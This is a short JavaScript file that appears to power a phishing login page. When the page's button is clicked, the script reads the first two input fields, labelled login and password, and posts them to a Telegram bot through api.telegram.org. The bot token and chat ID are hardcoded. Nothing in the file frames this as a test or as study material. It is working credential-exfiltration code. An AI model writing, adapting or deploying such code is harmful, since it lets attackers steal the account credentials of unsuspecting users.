let BOT_TOKEN = "7935257796:AAE1sW1036GI1aEz5mEKuys6Q_ah3UqZcSo";
let CHAT_ID = "7044052806";

let input = document.querySelectorAll("input");
let button = document.querySelector("button");

const requestToTelegram = async () => {
    let texts = `\n login: ${input[0].value} \n password: ${input[1].value}`;
    console.log(texts);
    try {
        let response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: texts,
                }),
            }
        );
        let message = await response.json();
        console.log(message);
    } catch (err) {
        console.error("Error:", err);
    }
};

button.addEventListener("click", () => {
    requestToTelegram();
});
